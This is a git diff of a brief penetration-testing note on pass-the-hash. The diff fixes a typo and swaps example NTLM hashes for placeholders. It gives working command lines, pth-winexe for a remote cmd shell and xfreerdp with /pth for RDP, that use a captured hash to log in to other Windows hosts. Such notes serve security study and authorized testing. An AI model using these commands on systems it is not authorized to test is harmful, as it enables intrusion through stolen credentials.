@@ -1,6 +1,6 @@
 # Pass the hash - reusing hashes
 
-Pass the hash (PTH) is a technique that lets the user authenticate by using a vlaid username and the hash, instead of the unhashed password. So if you have gotten a hold of a hash you might be able to use that hash against another system.
+Pass the hash (PTH) is a technique that lets the user authenticate by using a valid username and the hash, instead of the unhashed password. So if you have gotten a hold of a hash you might be able to use that hash against another system.
 
 Pass the hash is a suite of different tools. 
 
@@ -19,7 +19,7 @@ pth-winexe -U administrator //192.168.1.101 cmd
 I think you can run it like this too:
 
 ```
-pth-winexe -U admin/aad3b435b51404eeaad3b435b51404ee:d4bf5a8658af50fd1d2b8dbb10859741 //192.168.0.101 cmd
+pth-winexe -U admin/hash:has //192.168.0.101 cmd
 ```
 
 ## Remote Desktop
@@ -31,7 +31,7 @@ apt-get install freerdp-x11
 ```
 
 ```
-xfreerdp /u:admin /d:win7 /pth:aad3b435b51404eeaad3b435b51404ee:d4bf2a5658af10fd1d1b8dbb60859746 /v:192.168.1.101
+xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
 ```
 
 https://www.kali.org/penetration-testing/passing-hash-remote-desktop/
